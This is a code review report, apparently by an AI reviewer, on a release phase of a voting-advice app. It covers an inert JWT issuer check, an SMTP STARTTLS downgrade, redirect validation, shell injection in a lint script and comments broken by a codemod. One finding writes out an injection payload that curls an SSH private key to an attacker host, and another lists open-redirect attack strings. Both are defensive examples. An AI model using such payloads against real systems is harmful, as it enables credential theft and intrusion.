---
phase: 151-ship-v0-2-akita-review-stack
reviewed: 2026-08-18T00:00:00Z
depth: standard
diff_base: ca10b9736
files_reviewed: 71
files_reviewed_list:
  - apps/docs/src/routes/+page.svelte
  - apps/frontend/eslint.config.mjs
  - apps/frontend/messages/sv/components.json
  - apps/frontend/src/lib/api/utils/auth/__tests__/token-endpoint.test.ts
  - apps/frontend/src/lib/contexts/voter/voterContext.svelte.ts
  - apps/frontend/src/lib/dynamic-components/entityCard/EntityCard.svelte
  - apps/frontend/src/lib/dynamic-components/entityList/EntityListWithControls.type.ts
  - apps/frontend/src/lib/server/admin/features/condenseArguments.ts
  - apps/frontend/src/lib/server/admin/features/generateQuestionInfo.ts
  - apps/frontend/src/lib/utils/viewTransition.ts
  - apps/frontend/src/params/etPl.ts
  - apps/frontend/src/routes/(voters)/(located)/+layout.ts
  - apps/frontend/src/routes/(voters)/(located)/questions/+layout.svelte
  - apps/frontend/src/routes/(voters)/(located)/questions/+page.svelte
  - apps/frontend/src/routes/(voters)/(located)/questions/category/[categoryId]/+page.svelte
  - apps/frontend/src/routes/(voters)/(located)/results/[[electionTab]]/[[entityTab=etPl]]/[[entity=etSg]]/[[id]]/+page.svelte
  - apps/frontend/src/routes/(voters)/(located)/results/[[electionTab]]/[[entityTab=etPl]]/[[entity=etSg]]/[[id]]/+page.ts
  - apps/frontend/src/routes/(voters)/(located)/results/[[electionTab]]/+layout.svelte
  - apps/frontend/src/routes/(voters)/(located)/results/[[electionTab]]/statistics/+page.svelte
  - apps/frontend/src/routes/(voters)/+layout.svelte
  - apps/frontend/src/routes/(voters)/constituencies/+page.svelte
  - apps/frontend/src/routes/(voters)/constituencies/+page.ts
  - apps/frontend/src/routes/(voters)/elections/+page.svelte
  - apps/frontend/src/routes/(voters)/elections/+page.ts
  - apps/frontend/src/routes/(voters)/info/+page.svelte
  - apps/frontend/src/routes/+layout.svelte
  - apps/frontend/src/routes/admin/(protected)/argument-condensation/+page.server.ts
  - apps/frontend/src/routes/admin/(protected)/argument-condensation/+page.svelte
  - apps/frontend/src/routes/admin/(protected)/question-info/+page.server.ts
  - apps/frontend/src/routes/admin/(protected)/question-info/+page.svelte
  - apps/frontend/src/routes/admin/login/+page.server.ts
  - apps/frontend/src/routes/candidate/(protected)/+layout.svelte
  - apps/frontend/src/routes/candidate/(protected)/profile/+page.svelte
  - apps/frontend/src/routes/candidate/(protected)/questions/[questionId]/+page.svelte
  - apps/frontend/src/routes/candidate/login/+page.server.ts
  - apps/frontend/src/routes/candidate/preregister/(authenticated)/elections/+page.svelte
  - apps/frontend/src/routes/loginRedirectTarget.ts
  - apps/supabase/scripts/lint-schema.mjs
  - apps/supabase/supabase/functions/identity-callback/index.ts
  - apps/supabase/supabase/functions/send-email/index.ts
  - apps/supabase/supabase/tests/database/00-helpers.test.sql
  - packages/app-shared/src/utils/mergeSettings.ts
  - packages/dev-seed/src/cli/seed.ts
  - packages/dev-tools/src/pem-to-jwk.ts
  - tests/playwright.config.ts
  - tests/scripts/determinism-batch.sh
  - tests/scripts/e2e-run.sh
  - tests/tests/fixtures/shared/navMenu.fixture.ts
  - tests/tests/fixtures/voter/entityDetails.fixture.ts
  - tests/tests/fixtures/voter/questionInfo.fixture.ts
  - tests/tests/fixtures/voter/resultsPage.fixture.ts
  - tests/tests/setup/shared/base.teardown.ts
  - tests/tests/specs/_probes/orgMatching.probe.spec.ts
  - tests/tests/specs/_probes/popupNotice.probe.spec.ts
  - tests/tests/specs/_probes/video.probe.spec.ts
  - tests/tests/specs/perf/performance-budget.spec.ts
  - tests/tests/specs/voter/eperm07-term-trigger.spec.ts
  - tests/tests/specs/voter/voter-alliance.spec.ts
  - tests/tests/specs/voter/voter-dark-mode.spec.ts
  - tests/tests/specs/voter/voter-journey.spec.ts
  - tests/tests/specs/voter/voter-nominations.spec.ts
  - tests/tests/utils/testIds.ts
  - README.md
  - apps/frontend/src/routes/README.md
  - apps/frontend/src/lib/api/utils/auth/__tests__/authorize-endpoint.test.ts
  - apps/frontend/src/lib/api/utils/auth/getIdTokenClaims.test.ts
  - apps/frontend/src/lib/api/utils/auth/providers/idura.test.ts
  - apps/frontend/src/lib/api/utils/auth/providers/signicat.test.ts
  - apps/frontend/src/lib/utils/route/buildRoute.ts
  - apps/supabase/supabase/functions/identity-callback/claimConfig.test.ts
  - apps/frontend/src/routes/candidate/(protected)/preview/+page.svelte
  - apps/frontend/src/routes/(voters)/nominations/+page.svelte
findings:
  critical: 2
  warning: 11
  info: 6
  total: 19
status: issues_found
---

# Phase 151: Code Review Report

**Reviewed:** 2026-08-18
**Depth:** standard (per-file analysis with language-specific checks)
**Diff base:** `ca10b9736..HEAD` (155 commits)
**Files reviewed:** 71 in the nominated scope, plus 8 adjacent files pulled in by call-chain tracing
**Status:** issues_found

## Coverage statement (read this before the findings)

Honest accounting of what was and was not done.

**Read in full (whole-file, not just the diff hunk):**
`loginRedirectTarget.ts`; `admin/login/+page.server.ts`; `candidate/login/+page.server.ts`;
`send-email/index.ts`; `schema/502-email-helpers.sql` (function body, both copies);
`identity-callback/index.ts`; `pem-to-jwk.ts`; `lint-schema.mjs`;
`performance-budget.spec.ts`; `candidate/auth/callback/+server.ts` (pulled in by tracing);
`hooks.server.ts` redirect block; `Expander.svelte` title markup; `app.css` heading layer;
`statistics/+page.svelte` template; `apps/docs/src/routes/+page.svelte` content section.

**Diff-reviewed, non-comment lines isolated mechanically** (`git diff` filtered to lines that are not
`*`/`//`/`<!--`/`#` prefixed): all remaining files in the nominated 71. For most of them the filter
returned **empty** — the phase's change to them is comment text only. The Svelte-5 reactivity claim
was additionally verified by a repo-wide scan for `$derived(ctx.dataRoot)` aliases and for
`appSettings`/`dataRoot`/`locale` appearing in a destructuring pattern.

**Not reviewed:** the ~550 files outside the nominated 71 touched only by the comment-hygiene codemod.
The scoping decision is accepted, but see **WR-08** — the codemod's own output is *not* fully clean,
and its defects are by construction invisible to `yarn build` / `test:unit` / E2E. I sampled the
codemod's output repo-wide with targeted greps rather than reading those files; that sample found 13
broken comments and I have no basis to claim it found all of them.

**Not verified by execution.** No test suite was run and no database was started for this review. Where
a finding depends on runtime behaviour I say so and give the reasoning. The Postgres array-slice
semantics in WR-07 were reasoned from the catalog documentation, not measured against a live server.

**Depth honesty.** 71 files at `standard` depth is at the edge of what one pass can cover. The eight
nominated high-value targets received full attention; the ~50 comment-only files received a mechanical
non-comment-line diff and no more. If a behaviour change is hiding inside a comment-shaped edit in one
of those files, this review would not have caught it.

---

## Summary

Seven of the eight nominated targets were checked and are **substantively correct**: the
`safeRedirectTarget` regex genuinely rejects every open-redirect vector I threw at it (verified by
executing the regex against 18 attack strings — protocol-relative, absolute, backslash, encoded,
userinfo, traversal, CR/LF, fragment: all rejected, all legitimate paths accepted); the `send-email`
RPC argument-name repair matches the SQL signature exactly and the `p_template_*` arguments are
genuinely unused by the function body so `''` is harmless; `pem-to-jwk` fails closed and logs no key
material; the Svelte-5 destructure fix is correct on both layouts and correctly distinguishes the
value-replacing `appSettings` (safe `$derived` alias) from the identity-stable `dataRoot` (direct
`voterCtx.dataRoot.<prop>` reads at lines 180 and 353); the `lint-schema.mjs` port and `int2vector`
0-based-slice fixes are both right; the 19 server-side `console.*` calls are gone with no error
handling lost (two of them were *upgraded* to `logDebugError`); and the perf spec's 5,000 ms budget and
`RESULTS_FETCH_BUDGET = 13` were **not** weakened.

The eighth — the identity-token issuer check — is the problem, and it is the most serious finding here.
**CR-01: the newly added issuer validation is inert in every documented deployment**, because it reads
an environment variable that no setup path in this repository provides to the Edge Function runtime,
and the code deliberately skips the check when the variable is unset. Its sibling audience check reads
a variable name (`IDENTITY_PROVIDER_CLIENT_ID`) that appears nowhere in `.env.example` or the
deployment guide. The function is reachable with the published anon key. The net effect is that a
signature-valid token issued by the configured provider to a *different* relying party is accepted and
mints a candidate account plus a login link.

**CR-02** is in the same file family: the `send-email` TLS change writes a security claim into a
comment that the code does not implement, and leaves SMTP credentials transmissible in cleartext under
a STARTTLS-downgrade.

Beyond those, the perf spec's warm-up reload is correct in intent but introduces two real regressions
in the spec's own stated properties (WR-01 test-timeout budget not raised; WR-02 time-based rather
than load-based fetch partition, plus stale calibration evidence), and the redirect sweep missed a
third auth-redirect site (WR-04). The comment-hygiene codemod left 13 semantically broken comments in
shipped source (WR-08). The docs landing page gained a new heading-order violation in the same phase
that fixed one on the statistics page (WR-09).

Nothing in the known-and-accepted list is re-raised.

---

## Critical Issues

### CR-01: The added identity-token issuer check is inert — and the audience check with it

**File:** `apps/supabase/supabase/functions/identity-callback/index.ts:70-91`
**Also:** `tests/IDURA-TEST-RUNBOOK.md:77-81, 105-121`; `.env.example:45,59`;
`apps/supabase/supabase/config.toml:379`

**Issue.** The phase's headline security fix is written as opt-in:

```ts
const clientId = Deno.env.get('IDENTITY_PROVIDER_CLIENT_ID');
const issuer   = Deno.env.get('IDENTITY_PROVIDER_ISSUER');
const verifyOptions: jose.JWTVerifyOptions = {};
if (clientId) verifyOptions.audience = clientId;
if (issuer)   verifyOptions.issuer   = issuer;      // <- new
const { payload } = await jose.jwtVerify(jwt, jose.createRemoteJWKSet(new URL(jwksUri)), verifyOptions);
```

The in-code rationale states the conditional is so "a deployment that has not set
`IDENTITY_PROVIDER_ISSUER` keeps its current behaviour instead of failing closed on upgrade." The
problem is that **no deployment sets it**, and nothing in the repository ever will:

- `IDENTITY_PROVIDER_ISSUER` is present in `.env.example:59`, but that is the **root** `.env`, consumed
  by the SvelteKit server (`apps/frontend/src/lib/server/constants.ts:8`). Supabase Edge Functions do
  not read it.
- `tests/IDURA-TEST-RUNBOOK.md:77-81` is the repository's authoritative enumeration of the un-prefixed
  variables this function reads — "`IDENTITY_PROVIDER_TYPE`, `IDENTITY_PROVIDER_DECRYPTION_JWKS`,
  `IDENTITY_PROVIDER_JWKS_URI`, `IDENTITY_PROVIDER_CLIENT_ID`, plus optional `DEFAULT_PROJECT_ID`,
  `SITE_URL`." **`IDENTITY_PROVIDER_ISSUER` is not in that list, and the phase did not add it.** Neither
  Option A (`--env-file ../../../.env`, which would pick it up only by accident of file sharing) nor
  Option B (`functions/.env`, whose template block at lines 111-118 omits it) provisions it deliberately.
- `apps/supabase/supabase/config.toml:379` has `[edge_runtime.secrets]` commented out.
- `apps/supabase/supabase/functions/.env` does not exist (confirmed by `ls`).

And the pre-existing audience check is in the same or worse shape: a repo-wide grep for
`IDENTITY_PROVIDER_CLIENT_ID` (un-prefixed) returns **only** this function and the runbook's Option B
block. `.env.example:45` and `apps/docs/.../deployment/+page.md:181` document the **`PUBLIC_`-prefixed**
frontend variable, a different name. So `clientId` is `undefined` too.

With both `undefined`, `verifyOptions` is `{}` and `jose.jwtVerify` validates **only** the signature
against the remote JWKS plus `exp`/`nbf`.

**Concrete failure scenario.** The function has no `[functions.identity-callback] verify_jwt = false`
override, so Supabase's default applies and it is callable by anyone holding the project's **published
anon key** — a public value shipped to every browser. An attacker who obtains any id_token signed by a
key in `IDENTITY_PROVIDER_JWKS_URI`'s JWKS — for example, a token the same Signicat/Idura tenant issued
to a *different* relying party, which is precisely the token-substitution case an `aud` check exists to
reject — POSTs it to `/functions/v1/identity-callback`. Verification passes. `extractIdentityClaims`
succeeds. Lines 262-286 create a Supabase auth user keyed on the attacker's claim value, lines 301-328
create a `candidates` row and a `candidate` role assignment, and lines 337-387 return a magic-link
`action_link` / `hashed_token` that logs the attacker straight into the candidate app. There is no
nonce and no state binding on this path, so the token is also replayable until `exp`.

There is a second, quieter consequence: because `verify_jwt` defaults to true but the anon key satisfies
it, the "the frontend's equivalent verifier already applies it" mitigation named in the comment does not
apply — the comment itself says the function "is reachable directly at
`/functions/v1/identity-callback` without passing through it." That is correct, and it is exactly why
the conditional is the wrong shape.

**Fix.** Fail closed, and provision the variables.

```ts
// identity-callback/index.ts — read once at module scope so a misconfigured deployment
// fails on cold start, not silently on every request.
const EXPECTED_ISSUER = Deno.env.get('IDENTITY_PROVIDER_ISSUER');
const EXPECTED_AUDIENCE = Deno.env.get('IDENTITY_PROVIDER_CLIENT_ID');
if (!EXPECTED_ISSUER || !EXPECTED_AUDIENCE) {
  throw new Error(
    'identity-callback: IDENTITY_PROVIDER_ISSUER and IDENTITY_PROVIDER_CLIENT_ID are REQUIRED. ' +
      'Without both, a token this provider issued to any other relying party is accepted here. ' +
      'Set them via `supabase secrets set` (or functions/.env locally).'
  );
}

async function verifyJwt(jwt: string): Promise<jose.JWTPayload> {
  const { payload } = await jose.jwtVerify(jwt, jose.createRemoteJWKSet(new URL(jwksUri)), {
    issuer: EXPECTED_ISSUER,
    audience: EXPECTED_AUDIENCE
  });
  return payload;
}
```

Then add **both** names to `tests/IDURA-TEST-RUNBOOK.md` Step 3 (the un-prefixed list at :77-81 *and*
the Option B `functions/.env` template at :111-118), to `.env.example` with a comment saying they are
Edge-Function secrets rather than frontend vars, and to
`apps/docs/src/routes/(content)/developers-guide/deployment/+page.md`.

If failing closed on upgrade is genuinely unacceptable for an already-deployed instance, the honest
intermediate is to log a loud startup warning **and** reject on a per-request basis for the
account-*creation* path (lines 262-286) while allowing lookup of an already-linked identity — never a
silent skip.

---

### CR-02: SMTP credentials remain transmissible in cleartext, and the new comment claims otherwise

**File:** `apps/supabase/supabase/functions/send-email/index.ts:215-232`

**Issue.** The change is a real improvement over the prior unconditional
`tls: { rejectUnauthorized: false }`, but it ships two defects.

1. **The mitigation the new comment asserts is not implemented.** The comment at lines 225-228 states:
   *"Certificate verification is NOT relaxed on the credentialed path: doing so would send
   SMTP_USER/SMTP_PASS over a channel whose peer is unauthenticated."* The transport is configured
   `secure: false` (line 218) with **no `requireTLS`**. Nodemailer's `secure: false` + absent
   `requireTLS` means STARTTLS is *opportunistic*: if the server does not advertise `STARTTLS` in its
   EHLO response, nodemailer proceeds in **cleartext and still sends `AUTH`**. An on-path attacker
   strips the `250-STARTTLS` capability line from the EHLO response — a textbook downgrade, no
   certificate needed — and receives `SMTP_USER` / `SMTP_PASS` in the clear, along with every
   candidate's email address and message body. The comment's claim is false as written, which is worse
   than no comment: a future reader will trust it.

2. **The dev/prod discriminator is a heuristic, not a fact.** "No `SMTP_USER`/`SMTP_PASS`" is asserted
   to mean "local Inbucket/Mailpit". It does not. IP-allowlisted internal relays, a `localhost` Postfix
   submission agent inside the deployment network, and AWS SES VPC endpoints all take no SMTP
   credentials, and all of them would silently receive `rejectUnauthorized: false` in production —
   accepting any self-signed certificate from any MITM.

Both legs are credential/PII exposure on the transactional-email path, which is why this is Critical
rather than Warning despite the change being a net improvement on what preceded it.

**Fix.** Make the insecure posture explicit and opt-in, and require TLS on the credentialed path.

```ts
const smtpHost = Deno.env.get('SMTP_HOST') || 'inbucket';
const smtpPort = parseInt(Deno.env.get('SMTP_PORT') || '2500');
const smtpUser = Deno.env.get('SMTP_USER');
const smtpPass = Deno.env.get('SMTP_PASS');

// Explicit opt-in. Never inferred from the absence of credentials: an unauthenticated
// relay is a normal production shape, not proof of a local dev mailbox.
const allowInsecureTls = Deno.env.get('SMTP_ALLOW_INSECURE_TLS') === 'true';

const transportConfig: Record<string, unknown> = {
  host: smtpHost,
  port: smtpPort,
  secure: smtpPort === 465,
  // Refuse to transmit at all if the peer will not upgrade. Without this, an EHLO
  // that omits STARTTLS causes a silent cleartext AUTH.
  requireTLS: !allowInsecureTls
};

if (smtpUser && smtpPass) transportConfig.auth = { user: smtpUser, pass: smtpPass };
if (allowInsecureTls) transportConfig.tls = { rejectUnauthorized: false };
```

Document `SMTP_ALLOW_INSECURE_TLS=true` in `.env.example` next to the other local-dev SMTP settings,
and correct the comment to describe what the code now actually guarantees.

---

## Warnings

### WR-01: The warm-up reload doubles the perf spec's worst case but its test timeout was not raised

**File:** `tests/tests/specs/perf/performance-budget.spec.ts:128-131, 155-181`

**Issue.** `RENDER_WAIT_CEILING_MS = 20_000` exists for a stated reason (lines 121-125): so an
over-budget render fails as a legible `expected 6234 to be less than 5000` rather than as an opaque
locator timeout. The spec previously performed **one** reload with **two** ceiling-bounded waits. It
now performs **two** reloads with **four**. The test timeout was left at `voterTest.setTimeout(90000)`
and the comment above it (lines 128-131) still reads *"Fixture walk (~15-27s) + reload + measurement"*
— singular.

**Concrete failure scenario.** Fixture walk at its documented worst case (27 s) + warm-up reload with
both waits at ceiling (40 s) already consumes 67 s. The measured reload's two waits then have 23 s of
the 90 s left, not 40. In the exact case the ceiling was designed for — a genuine performance
regression that pushes the render past 5,000 ms but under 20,000 ms — the test now has a live chance of
dying at 90 s on a Playwright test-timeout, which reports "Test timeout of 90000ms exceeded" and names
no budget at all. The property the ceiling was introduced to guarantee is silently weaker than before.

**Fix.**

```ts
// tests/tests/specs/perf/performance-budget.spec.ts
// Fixture walk (~15-27s) + TWO reloads (warm-up + measured), each with two
// ceiling-bounded waits, so the over-budget case must fit 27 + 4x20 = 107s and
// still report as an assertion failure rather than a test timeout.
voterTest.setTimeout(150_000);
```

Alternatively bound the *warm-up* waits with a tighter, separate constant (the warm-up has no budget to
report, so it can fail fast), leaving the full ceiling only for the measured pair.

### WR-02: The fetch-count partition is time-based, not load-based, and its calibration is now stale

**File:** `tests/tests/specs/perf/performance-budget.spec.ts:169, 137-142`

**Issue.** Two distinct problems in the `resultsFetches` guard, which the prompt flagged as the change
most likely to have quietly disabled a regression guard. The budget itself is intact — but the guard's
*evidence base* is not.

1. **Time-based partition.** `resultsFetches.length = 0` fires at one instant: after the warm-up's
   `matchScore` first becomes visible. Any `/rest/v1/` request the warm-up load issues *after* that
   moment — a deferred fetch, a retry, a below-the-fold data load triggered by the list container's
   `content-visibility: auto` finally resolving — is attributed to the measured load. Observed count is
   11 against a budget of 13, so **two** late warm-up requests are enough to red the gate with no
   application change whatsoever. In a repository whose CLAUDE.md declares flaky tests a cardinal
   failure, a partition that depends on nothing being in flight at an arbitrary instant is the wrong
   mechanism.

2. **Stale calibration.** The docblock's evidence — "the route issued exactly **11** `/rest/v1/`
   requests in 8/8 runs" and the four-run table added by this phase — was all measured on a load that
   was the route's **first** server render. The spec now measures the **second**. Nobody has established
   that 11 is still the invariant count for a warm second load (SvelteKit's client router, the
   `dataRoot` cache and any HTTP caching all plausibly change it), so the budget's stated headroom of 2
   is unverified for the shape actually being measured. A guard whose recorded baseline describes a
   different measurement than the one it performs cannot be reasoned about when it eventually fires.

**Fix.** Partition by load rather than by time, and re-record the calibration:

```ts
// Attach the counter only after the warm-up has fully settled, so the array can
// only ever contain the measured load's requests.
const list = page.getByTestId(testIds.voter.results.list);
const matchScore = page.getByTestId(testIds.voter.results.matchScore);

// WARM-UP RELOAD — unmeasured, uncounted.
await page.reload({ waitUntil: 'load' });
await list.waitFor({ state: 'visible', timeout: WARMUP_WAIT_CEILING_MS });
await matchScore.first().waitFor({ state: 'visible', timeout: WARMUP_WAIT_CEILING_MS });
await page.waitForLoadState('networkidle');

const resultsFetches: Array<string> = [];
const onRequest = (request: Request) => {
  const url = request.url();
  if (url.includes('/rest/v1/')) resultsFetches.push(`${request.method()} ${url}`);
};
page.on('request', onRequest);

// MEASURED RELOAD ...
```

Then re-run the 8-run calibration on the new two-reload shape and replace the docblock's numbers,
noting explicitly that they describe a *warm second load*.

### WR-03: `safeRedirectTarget` is a security control with zero test coverage

**File:** `apps/frontend/src/routes/loginRedirectTarget.ts:37,47-51`

**Issue.** The regex is correct today — I executed it against 18 vectors and every one behaved
(`//evil.com`, `https://evil.com`, `\\evil.com`, `/candidate`, `../../x`, `..%2f..%2fadmin`,
`%2f%2fevil.com`, `javascript:alert(1)`, `user@evil.com`, `questions#frag`, `\tcandidate`,
`candidate/profile\n`, `candidate//profile`, `?x=1` all rejected; `candidate/profile` and
`candidate/profile?x=1` accepted; and JavaScript's `$` correctly does *not* match before a trailing
newline). But a repo-wide grep confirms **no test anywhere references `safeRedirectTarget` or
`loginRedirectTarget`** — no vitest unit test, no E2E assertion.

**Concrete failure scenario.** `RELATIVE_APP_PATH` is a dense 90-character regex with a deliberately
narrow character class. The day someone needs a route segment containing `.` (a versioned path, a
filename), or needs to accept a leading `/` for symmetry with some new caller, they widen the class —
and reintroduce the open redirect with no test to stop them. The green-suite evidence the phase cites
proves nothing here: no test exercises this function at all, so the suite would stay green through a
total regression.

**Fix.** Add `apps/frontend/src/routes/loginRedirectTarget.test.ts` (or relocate the module per IN-04
and test it there):

```ts
import { describe, expect, it } from 'vitest';
import { safeRedirectTarget } from './loginRedirectTarget';

describe('safeRedirectTarget', () => {
  it.each([
    '//evil.com', 'https://evil.com', '\\\\evil.com', '/candidate', '../../x',
    '..%2f..%2fadmin', '%2f%2fevil.com', 'javascript:alert(1)', 'user@evil.com',
    'questions#frag', '\tcandidate', 'candidate/profile\n', 'candidate//profile',
    '?x=1', '', null, undefined
  ])('rejects %j', (input) => expect(safeRedirectTarget(input as string)).toBeUndefined());

  it.each(['candidate', 'candidate/profile', 'candidate/profile/', 'candidate/profile?tab=1'])(
    'accepts %j',
    (input) => expect(safeRedirectTarget(input)).toBe(input)
  );
});
```

### WR-04: The redirect-validation sweep missed the third auth-redirect site

**File:** `apps/frontend/src/routes/candidate/auth/callback/+server.ts:23,44`

**Issue.** `next` is read straight off `url.searchParams` (line 23) and interpolated at line 44 after
stripping exactly one leading slash:

```ts
redirect(303, next ? `/${lang}/${next.replace(/^\//, '')}` : `/${lang}/candidate`);
```

This is **not** a cross-origin open redirect — the `/${lang}/` prefix holds the result same-origin, and
a single-slash strip cannot produce `//host` (`//evil.com` becomes `/en//evil.com`, and backslash
variants normalise back into the path). I verified that. But it is precisely the residual risk
`loginRedirectTarget.ts`'s own docblock says it exists to close: *"it does not stop a crafted link from
steering a just-authenticated user to an arbitrary in-origin path."* The phase applied that guard to two
of the three auth-redirect sites and left the third — which is arguably the more attacker-friendly one,
since `next` arrives via a Supabase confirmation link rather than requiring a form POST.

**Fix.**

```ts
import { safeRedirectTarget } from '../../../loginRedirectTarget';
// ...
const next = safeRedirectTarget(url.searchParams.get('next'));
// ...
case 'email':
case 'signup':
  redirect(303, next ? `/${lang}/${next}` : `/${lang}/candidate`);
  break;
```

Note the `.replace(/^\//, '')` becomes unnecessary, because `safeRedirectTarget` already rejects a
leading slash.

### WR-05: The encrypted-PEM guard misses legacy OpenSSL encrypted keys

**File:** `packages/dev-tools/src/pem-to-jwk.ts:64,77-84`

**Issue.** The guard tests only for the PKCS#8 header:

```ts
const isEncrypted = /-----BEGIN ENCRYPTED PRIVATE KEY-----/.test(pem);
```

Traditional OpenSSL encrypted PEMs — which is what `openssl genrsa -aes256 -out key.pem 2048` produces,
still the most commonly typed key-generation command — carry the header `-----BEGIN RSA PRIVATE
KEY-----` with the encryption signalled by `Proc-Type: 4,ENCRYPTED` and `DEK-Info:` header lines inside
the block. Those match `isPrivate` (line 65) but not `isEncrypted`, so they fall straight through to
`jose.importPKCS8` at line 90 and produce exactly the opaque decode error the guard was added to
prevent.

**Concrete failure scenario.** An operator following `docs/key-generation.md` reaches for
`openssl genrsa -aes256`, is prompted for a passphrase, then runs `pem-to-jwk --in key.pem` and gets an
unactionable jose error with no mention of passphrases — the exact experience the fix targeted.

The fix does satisfy the safety criteria the prompt asked about: it exits 1, logs no key material, and
its remediation command is correct.

**Fix.**

```ts
// Both encrypted-PEM encodings: PKCS#8 signals it in the header line, traditional
// OpenSSL (openssl genrsa -aes256) signals it with Proc-Type/DEK-Info inside the block.
const isEncrypted =
  /-----BEGIN ENCRYPTED PRIVATE KEY-----/.test(pem) || /^Proc-Type:\s*4,ENCRYPTED/m.test(pem);
```

and widen the remediation hint, since `openssl pkcs8 -topk8 -nocrypt` is the wrong command for a
traditional-format key (`openssl rsa -in key.pem -out decrypted.pem` is).

### WR-06: `DATABASE_URL` is interpolated unquoted into a shell command

**File:** `apps/supabase/scripts/lint-schema.mjs:102,119` (line 27 was edited by this phase)

**Issue.**

```js
const stdout = execSync(`psql ${DB_URL} --tuples-only --no-align --field-separator='|'`, { ... });
```

`DB_URL` is `process.env.DATABASE_URL || <default>`. `execSync` runs through `/bin/sh`, and the value
is neither quoted nor escaped. A connection string containing `;`, a backtick, `$(...)`, `&` or `|`
executes arbitrary shell commands with the invoking user's privileges. Even without malice, a perfectly
ordinary password containing `&` or a space silently truncates the command and produces a
connect-failure message that names the wrong problem.

**Concrete failure scenario.** `DATABASE_URL='postgresql://x@h/db; curl attacker.tld/$(cat ~/.ssh/id_rsa | base64)'`
in a CI environment, or a developer whose password contains `$(`. This is a dev-tooling script rather
than a production surface, which is why it is Warning rather than Critical, but the remedy is one line.

**Fix.**

```js
import { execFileSync } from 'node:child_process';

function runQuery(sql) {
  const stdout = execFileSync('psql', [DB_URL, '--tuples-only', '--no-align', '--field-separator=|'], {
    encoding: 'utf-8',
    input: sql.trim(),
    stdio: ['pipe', 'pipe', 'pipe']
  });
  // ...
}
```

Apply the same change to `ensurePostgresAvailable()` at line 119.

### WR-07: The repaired FK check still has false negatives — partial, invalid and INCLUDE-column indexes

**File:** `apps/supabase/scripts/lint-schema.mjs:74-86`

**Issue.** The off-by-one repair itself is **correct** — I checked the arithmetic in both directions.
`pg_index.indkey` is an `int2vector` with lower bound 0, so for a `k`-column FK the slice
`i.indkey[0 : k-1]` yields exactly `k` leading elements (`k=1` → `indkey[0:0]` → one element), and
PostgreSQL's array equality compares dimensions and elements while ignoring lower bounds, so comparing
it to `c.conkey[1:k]` is sound. A composite FK covered only by a shorter index still reports correctly
(`indkey[0:1]` on a one-column index yields one element, which cannot equal a two-element `conkey`).
The `connamespace = 'public'` scoping is also right, since a table constraint's namespace is its
table's. No new off-by-one was introduced.

What the `NOT EXISTS` subquery does **not** do is qualify *which* `pg_index` rows count:

- **Partial indexes** (`indpred IS NOT NULL`) match. `CREATE INDEX ON t (fk_col) WHERE deleted_at IS
  NULL` makes an FK look indexed to this gate while doing nothing for the FK's referential-integrity
  lookups or for `ON DELETE` cascade scans.
- **Invalid indexes** (`indisvalid = false`, e.g. a failed `CREATE INDEX CONCURRENTLY`) match. Those
  are not used by the planner at all.
- **`INCLUDE` columns** are present in `indkey` beyond `indnkeyatts`, so an index declared
  `(a) INCLUDE (b)` can satisfy a two-column FK `(a, b)` even though `b` is not a searchable key column.

Splinter's own 0001 advisor qualifies these; this derived copy does not.

**Concrete failure scenario.** Someone adds a partial index to a hot table, `yarn db:lint:sql` goes
green, and the FK stays effectively unindexed. This is the *false negative* direction — the one a gate
can never afford, and the one this whole check exists to prevent.

**Fix.**

```sql
  AND NOT EXISTS (
    SELECT 1
    FROM pg_index i
    WHERE i.indrelid = c.conrelid
      -- Only indexes the planner will actually use for this FK:
      AND i.indisvalid                       -- not a failed CREATE INDEX CONCURRENTLY
      AND i.indpred IS NULL                  -- not partial
      AND i.indnkeyatts >= array_length(c.conkey, 1)  -- FK cols are KEY cols, not INCLUDE cols
      AND c.conkey[1:array_length(c.conkey, 1)]::smallint[]
        = (i.indkey[0:array_length(c.conkey, 1) - 1])::smallint[]
  )
```

### WR-08: The comment-hygiene codemod left 13 semantically broken comments in shipped source

**Files (all `file:line`):**

```
apps/frontend/src/lib/api/utils/auth/__tests__/authorize-endpoint.test.ts:6    "* protection (from)."
apps/frontend/src/lib/api/utils/auth/__tests__/token-endpoint.test.ts:5        "* via the active identity provider (from)."
apps/frontend/src/lib/api/utils/auth/__tests__/token-endpoint.test.ts:294      "which see phase 140 converted"
apps/frontend/src/lib/api/utils/auth/getIdTokenClaims.test.ts:6                "* identity claims from the inner JWT (from)."
apps/frontend/src/lib/api/utils/auth/providers/idura.test.ts:6                 "* authorization URL with the expected structure (from)."
apps/frontend/src/lib/api/utils/auth/providers/signicat.test.ts:6              "* matching the expected format (from)."
apps/frontend/src/lib/contexts/app/appContext.spread.svelte.test.ts:7          "orchestrators which see phase 109 does"
apps/frontend/src/lib/contexts/voter/voterContext.svelte.ts:92                 "// documented."
apps/frontend/src/lib/contexts/voter/voterContext.svelte.ts:98                 "// the candidate-side fix in). The behavior is"
apps/frontend/src/lib/utils/route/buildRoute.ts:20                             "* surface; new in). `buildRoute(...)` routes"
apps/supabase/supabase/functions/identity-callback/claimConfig.test.ts:6       "* behavior with various payloads (from)."
packages/dev-seed/src/cli/seed.ts:8                                            "*   3. resolveTemplate(--template) => validated Template (10)."
tests/playwright.config.ts:437, 486                                            "As of WR-03 (see phase 140) it JOINS...", "the property see phase 140 CR-01 (iteration 2) added"
```

**Issue.** These are not stylistic quibbles — they are sentences whose object has been deleted, leaving
a dangling preposition and no meaning. `packages/dev-seed/src/cli/seed.ts:8` now reads *"resolveTemplate
(--template) => validated Template (10)"*, where `(10)` is the surviving fragment of `(TMPL-06,
D-58-09/10)`; a reader has no way to recover what `(10)` refers to. `voterContext.svelte.ts:92-98` now
documents a reactivity fix as *"mirroring the candidateContext fix documented."* and *"same root-cause
class as the candidate-side fix in)."* — pointer comments that point nowhere, on the file that
implements the destructure-trap workaround the whole Svelte-5 migration rests on.

This matters more than usual for this phase specifically: five of the thirteen are in **auth and
identity-provider test files**, and one is in `claimConfig.test.ts` — the test file for the very Edge
Function whose issuer check is the subject of CR-01. Docblock lines that say what the tests cover are
now truncated mid-clause.

These are also, by construction, invisible to the phase's stated gates. `yarn build`, `yarn test:unit`
and the E2E suite cannot see inside a comment span, which is exactly why the codemod was declared safe —
and exactly why a residue pass was required. The residue pass did not catch these.

I found these by targeted grep, not by reading all ~550 codemod-touched files. **The list above is a
sample, not an exhaustive enumeration.**

**Fix.** Reword each of the 13, then re-run a residue sweep with patterns that catch truncation rather
than just planning tokens:

```bash
# Dangling-preposition / orphaned-parenthetical residue, comment lines only.
